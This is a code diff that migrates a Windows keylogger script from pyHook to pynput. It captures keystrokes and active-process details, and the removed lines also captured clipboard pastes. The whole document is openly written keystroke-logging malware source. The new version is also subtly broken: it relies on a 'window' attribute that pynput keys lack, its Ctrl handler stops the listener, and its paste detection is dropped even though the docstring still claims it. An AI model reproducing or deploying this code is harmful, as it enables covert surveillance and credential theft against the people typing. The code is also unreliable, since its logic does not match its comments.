@@ -1,8 +1,6 @@
-from ctypes import *  # Import ctypes for interacting with Windows API
-
-import pyHook  # Import pyHook for keyboard event hooking
-import pythoncom  # Import pythoncom for COM message pumping
+from pynput import keyboard  # Import pynput for keyboard event hooking
 import win32clipboard  # Import win32clipboard for clipboard operations
+from ctypes import *  # Import ctypes for interacting with Windows API
 
 # Load Windows DLLs for API calls
 user32 = windll.user32  # User32.dll for window handling
@@ -48,38 +46,38 @@ def get_current_process():
     kernel32.CloseHandle(h_process)
 
 
-def KeyStroke(event):
+def on_press(key):
     """
     Handles keyboard events, logs key presses, and detects clipboard paste actions.
     """
     global current_window  # Reference global variable to track window changes
 
-    # Check if the active window has changed
-    if event.WindowName != current_window:
-        current_window = event.WindowName  # Update current window
-        get_current_process()  # Log new process information
+    try:
+        # Check if the active window has changed
+        if hasattr(key, 'window') and key.window != current_window:
+            current_window = key.window  # Update current window
+            get_current_process()  # Log new process information
 
-    # Handle standard ASCII key presses (printable characters)
-    if 32 < event.Ascii < 127:
-        print(chr(event.Ascii), end=' ')  # Print the character
-    else:
-        # Handle Ctrl+V for clipboard paste
-        if event.Key == "V":
-            win32clipboard.OpenClipboard()  # Open the clipboard
-            pasted_value = win32clipboard.GetClipboardData()  # Get clipboard data
-            win32clipboard.CloseClipboard()  # Close the clipboard
-            print("[PASTE] - %s" % pasted_value, end=' ')  # Print pasted content
+        # Handle standard ASCII key presses (printable characters)
+        if isinstance(key, keyboard.KeyCode) and 32 < ord(key.char) < 127:
+            print(key.char, end=' ')  # Print the character
         else:
-            print("[%s]" % event.Key, end=' ')  # Print non-printable key name
+            # Handle Ctrl+V for clipboard paste
+            if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+                return False  # Do not print Ctrl key itself
+            print("[%s]" % key, end=' ')  # Print non-printable key name
 
-    # Allow the event to pass to the next registered hook
+    except AttributeError:
+        pass
+
     return True
 
 
-# Create and configure the hook manager
-kl = pyHook.HookManager()  # Initialize hook manager
-kl.KeyDown = KeyStroke  # Assign KeyStroke function to handle key down events
+# Start listening to keyboard events using pynput
+def start_listening():
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
-# Register the keyboard hook and run the message loop indefinitely
-kl.HookKeyboard()  # Hook the keyboard
-pythoncom.PumpMessages()  # Process messages to keep the hook active
+
+if __name__ == "__main__":
+    start_listening()
